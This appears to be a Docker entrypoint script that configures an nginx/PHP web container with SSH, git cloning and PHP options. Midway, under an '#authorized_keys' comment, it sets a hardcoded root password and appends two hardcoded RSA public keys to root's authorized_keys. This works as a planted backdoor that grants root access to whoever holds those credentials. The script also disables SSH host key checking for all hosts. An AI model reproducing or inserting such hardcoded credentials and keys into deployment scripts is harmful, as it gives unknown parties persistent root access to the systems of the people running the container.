#!/bin/bash
set -x
#proxy
if [ ! -z "$HTTP_PROXY" ]; then
  export http_proxy=$HTTP_PROXY
  export https_proxy=$HTTP_PROXY
  export ftp_proxy=$HTTP_PROXY
  export no_proxy="localhost, 127.0.0.1, ::1"
cat > /etc/profile.d/http_proxy_profile.sh <<EOF
    export proxy="$HTTP_PROXY"
    export http_proxy=$proxy
    export https_proxy=$proxy
    export ftp_proxy=$proxy
    export no_proxy="localhost, 127.0.0.1, ::1"
EOF
chmod +x /etc/profile.d/http_proxy_profile.sh || true
fi


# Copy default config from cache
if [ ! "$(ls -A /etc/ssh)" ]; then
   cp -a /etc/ssh.cache/* /etc/ssh/
fi

set_hostkeys() {
    printf '%s\n' \
        'set /files/etc/ssh/sshd_config/HostKey[1] /etc/ssh/keys/ssh_host_rsa_key' \
        'set /files/etc/ssh/sshd_config/HostKey[2] /etc/ssh/keys/ssh_host_dsa_key' \
        'set /files/etc/ssh/sshd_config/HostKey[3] /etc/ssh/keys/ssh_host_ecdsa_key' \
        'set /files/etc/ssh/sshd_config/HostKey[4] /etc/ssh/keys/ssh_host_ed25519_key' \
    | augtool -s
}

print_fingerprints() {
    local BASE_DIR=${1-'/etc/ssh'}
    for item in dsa rsa ecdsa ed25519; do
        echo ">>> Fingerprints for ${item} host key"
        ssh-keygen -E md5 -lf ${BASE_DIR}/ssh_host_${item}_key 
        ssh-keygen -E sha256 -lf ${BASE_DIR}/ssh_host_${item}_key
        ssh-keygen -E sha512 -lf ${BASE_DIR}/ssh_host_${item}_key
    done
}

# Generate Host keys, if required
if ls /etc/ssh/keys/ssh_host_* 1> /dev/null 2>&1; then
    echo ">> Host keys in keys directory"
    set_hostkeys
    print_fingerprints /etc/ssh/keys
elif ls /etc/ssh/ssh_host_* 1> /dev/null 2>&1; then
    echo ">> Host keys exist in default location"
    # Don't do anything
    print_fingerprints
else
    echo ">> Generating new host keys"
    mkdir -p /etc/ssh/keys
    ssh-keygen -A
    mv /etc/ssh/ssh_host_* /etc/ssh/keys/
    set_hostkeys
    print_fingerprints /etc/ssh/keys
fi

# Fix permissions, if writable
if [ -w ~/.ssh ]; then
    chown root:root ~/.ssh && chmod 700 ~/.ssh/
fi
#authorized_keys
echo root:nopost858897887|chpasswd && \
cat >> ~/.ssh/authorized_keys <<EOF
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCqYhfaxk236dVqi/mfUWcwDtNQLnY4ReWHsoshqG9cDuoYajkWw0z9+gkxAdHN5xKRG1SyMNQYuiur7bBn5BksrELqwz9PbfkcVopUHQY/3v1y/16IFtBYgtkmaE87djQoTln3CX8AAzpcUkIlkrxwOGPGUakYZBHX+aoMvsR8YQ== skey_384797
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDQHAKyXEz66UIHIKetfpGcpPM5aktKBWf36PssMxEWpwA/wrhNUybG8Zgi8GrxeHhHbJ6AifX+rGUJI4Y3gJPAu028+zXSj4wg9x581CCJy3X2zyNRgpzjmDyRBI5nZPGp1yO3YCsyk4G8Vn3/B0QuJKxqO8qDRD6vbpDocCoF1w== skey_443726
EOF
if [ -w ~/.ssh/authorized_keys ]; then
    chown root:root ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
fi
if [ -w /etc/authorized_keys ]; then
    chown root:root /etc/authorized_keys
    chmod 755 /etc/authorized_keys
    find /etc/authorized_keys/ -type f -exec chmod 644 {} \;
fi

# Add users if SSH_USERS=user:uid:gid set
if [ -n "${SSH_USERS}" ]; then
    USERS=$(echo $SSH_USERS | tr "," "\n")
    for U in $USERS; do
        IFS=':' read -ra UA <<< "$U"
        _NAME=${UA[0]}
        _UID=${UA[1]}
        _GID=${UA[2]}

        echo ">> Adding user ${_NAME} with uid: ${_UID}, gid: ${_GID}."
        if [ ! -e "/etc/authorized_keys/${_NAME}" ]; then
            echo "WARNING: No SSH authorized_keys found for ${_NAME}!"
        fi
        getent group ${_NAME} >/dev/null 2>&1 || addgroup -g ${_GID} ${_NAME}
        getent passwd ${_NAME} >/dev/null 2>&1 || adduser -D -u ${_UID} -G ${_NAME} -s '' ${_NAME}
        passwd -u ${_NAME} || true
    done
else
    # Warn if no authorized_keys
    if [ ! -e ~/.ssh/authorized_keys ] && [ ! $(ls -A /etc/authorized_keys) ]; then
      echo "WARNING: No SSH authorized_keys found!"
    fi
fi

# Update MOTD
if [ -v MOTD ]; then
    echo -e "$MOTD" > /etc/motd
fi

if [[ "${SFTP_MODE}" == "true" ]]; then
    : ${SFTP_CHROOT:='/data'}
    chown 0:0 ${SFTP_CHROOT}
    chmod 755 ${SFTP_CHROOT}

    printf '%s\n' \
        'set /files/etc/ssh/sshd_config/Subsystem/sftp "internal-sftp"' \
        'set /files/etc/ssh/sshd_config/AllowTCPForwarding no' \
        'set /files/etc/ssh/sshd_config/X11Forwarding no' \
        'set /files/etc/ssh/sshd_config/ForceCommand internal-sftp' \
        'set /files/etc/ssh/sshd_config/ChrootDirectory /data' \
    | augtool -s
fi

# Disable Strict Host checking for non interactive git clones
mkdir -p -m 0700 /root/.ssh
echo -e "Host *\n\tStrictHostKeyChecking no\n" >> /root/.ssh/config

if [ ! -z "$SSH_KEY" ]; then
 echo $SSH_KEY > /root/.ssh/id_rsa.base64
 base64 -d /root/.ssh/id_rsa.base64 > /root/.ssh/id_rsa
 chmod 600 /root/.ssh/id_rsa
fi

# Set custom webroot
if [ ! -z "$WEBROOT" ]; then
  webroot=$WEBROOT
  sed -i "s#root /var/www/html;#root ${webroot};#g" /etc/nginx/sites-available/default.conf
else
  webroot=/var/www/html
fi

# Setup git variables
if [ ! -z "$GIT_EMAIL" ]; then
 git config --global user.email "$GIT_EMAIL"
fi
if [ ! -z "$GIT_NAME" ]; then
 git config --global user.name "$GIT_NAME"
 git config --global push.default simple
fi

# Dont pull code down if the .git folder exists
if [ ! -d "/var/www/html/.git" ]; then
 # Pull down code from git for our site!
 if [ ! -z "$GIT_REPO" ]; then
   # Remove the test index file
   rm -Rf /var/www/html/index.php
   if [ ! -z "$GIT_BRANCH" ]; then
     git clone -b $GIT_BRANCH $GIT_REPO /var/www/html
   else
     git clone $GIT_REPO /var/www/html
   fi
 fi
fi

# Display PHP error's or not
if [[ "$ERRORS" != "1" ]] ; then
 echo display_errors = Off >> /etc/php7/conf.d/php.ini
else
 echo display_errors = On >> /etc/php7/conf.d/php.ini
fi

# Enable PHP short tag or not
if [[ "$SHORT_TAG" != "1" ]] ; then
 echo short_open_tag = Off >> /etc/php7/conf.d/php.ini
else
 echo short_open_tag = On >> /etc/php7/conf.d/php.ini
fi

# Display Version Details or not
if [[ "$HIDE_NGINX_HEADERS" == "0" ]] ; then
 sed -i "s/server_tokens off;/server_tokens on;/g" /etc/nginx/nginx.conf
else
 sed -i "s/expose_php = On/expose_php = Off/g" /etc/php7/conf.d/php.ini
fi

# Enable proxy for Docker-Hook at /docker-hook/
if [[ "$DOCKER_HOOK_PROXY" != "1" ]] ; then
 sed -i '/location \/docker-hook/,/.*\}/d' /etc/nginx/sites-available/default.conf
 sed -i '/location \/docker-hook/,/.*\}/d' /etc/nginx/sites-available/default-ssl.conf
fi

# Increase the memory_limit
if [ ! -z "$PHP_MEM_LIMIT" ]; then
 sed -i "s/memory_limit = 128M/memory_limit = ${PHP_MEM_LIMIT}M/g" /etc/php7/conf.d/php.ini
fi

# Increase the post_max_size
if [ ! -z "$PHP_POST_MAX_SIZE" ]; then
 sed -i "s/post_max_size = 100M/post_max_size = ${PHP_POST_MAX_SIZE}M/g" /etc/php7/conf.d/php.ini
fi

# Increase the upload_max_filesize
if [ ! -z "$PHP_UPLOAD_MAX_FILESIZE" ]; then
 sed -i "s/upload_max_filesize = 100M/upload_max_filesize= ${PHP_UPLOAD_MAX_FILESIZE}M/g" /etc/php7/conf.d/php.ini
fi

# Always chown webroot for better mounting
chown -Rf nginx.nginx /var/www/html

# Start supervisord and services
/usr/bin/supervisord -n -c /etc/supervisord.conf
